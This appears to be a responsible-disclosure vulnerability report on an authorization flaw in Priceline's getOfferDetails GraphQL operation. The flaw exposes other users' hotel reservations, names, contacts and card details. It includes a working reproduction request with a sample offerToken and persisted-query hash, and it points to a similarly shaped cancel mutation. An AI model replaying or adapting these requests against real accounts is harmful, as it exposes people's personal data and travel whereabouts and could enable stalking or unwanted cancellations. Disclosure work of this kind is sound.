# OfferBearer: Priceline GraphQL BOLA. Cross-account hotel reservation PII through offerToken

Found by nichoc0.

## Abstract

The GraphQL operation `getOfferDetails` authorizes on the supplied
offerToken alone. It never checks that the booking behind that token belongs
to the authenticated account. Any authenticated Priceline user sends another
user's offerToken with their own session and receives that user's hotel
reservation: full name, email address, phone number, hotel name and street
address, exact stay dates, total charges, and partial payment card (type and
last four). The server enforces authentication. It does not enforce object
ownership.

## Reproduction

Two test accounts, both controlled. Account A holds a hotel booking with
offerToken `10b35f83-bab5-4464-8730-91f6cdb867aa`. Account B is a different
account with a different custId.

Account B sends the request with its own session and bearer token, and
account A's token in the variables:

```http
POST /pws/v0/pcln-graph/?gqlOp=getOfferDetails HTTP/2
Host: www.priceline.com
Authorization: Bearer <ACCOUNT_B_TOKEN>
Cookie: <ACCOUNT_B_COOKIES>
Content-Type: application/json
apollographql-client-name: relax

{"operationName":"getOfferDetails","variables":{"offerToken":"10b35f83-bab5-4464-8730-91f6cdb867aa","appCode":"DESKTOP"},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"6a7cf9e8f9a38d6a06c5acce72bbfd3daa9fdc1738ab20c5953ae56a749e8ced"}}}
```

The response is HTTP 200 with account A's booking. Verbatim shape, PII
redacted here:

```json
{"data":{"offerDetails":{"offerDetails":{
  "offerNum":"35715472396",
  "customer":{"firstName":"<A>","lastName":"<A>","emailAddress":"<A email>","phoneList":[{"phoneNumber":"<A phone>"}]},
  "payment":{"creditCard":{"ccNumLastDigits":"6931","ccTypeDesc":"Visa"}},
  "primaryOffer":{"hotel":"Hotel Caza Fisherman's Wharf, 1300 Columbus Ave, San Francisco","checkIn":"2026-06-23","checkOut":"2026-06-27","totalCharges":"1189.64"}}}}}
```

Decoding account B's bearer token shows `sub` and `custId` values that differ
from the booking holder. Account B does not own this booking and the server
returns it anyway.

## Root Cause

offerToken is treated as a bearer capability. The resolver checks that the
caller is authenticated. It does not check that the offerToken's owning
account equals the caller's custId.

## Impact

Cross-account disclosure of another user's PII: full name, email, phone
number, hotel and street address, exact future travel dates, total charges,
and card type with last four digits. This is a privacy exposure under
GDPR/CCPA and it has a physical-safety dimension. The response ties a named
person to a specific hotel on specific nights. That is a stalking exposure,
not an ordinary data leak.

The offerToken itself is a UUIDv4 and does not brute force. It appears in
user-facing URLs (`/relax/cancel/{offerToken}`,
`/travel-itinerary/?offertoken={offerToken}`), so it reaches browser
history, server and proxy logs, and shared itinerary links. One request with
a held token returns the full record.

## Related surface

The cancel flow uses the same model. The `doCancelBooking` mutation carries
`offerToken`, `cguid`, and `reservationIds` with no account or ownership
field. Cross-account cancellation was not tested to avoid touching a booking.
The write path is shaped the same way as the read path proven above.

## Fix

On `getOfferDetails` and the cancel-flow operations, check that the
offerToken's owning account equals the authenticated caller's custId.
Return 403 otherwise.

## Credit

nichoc0
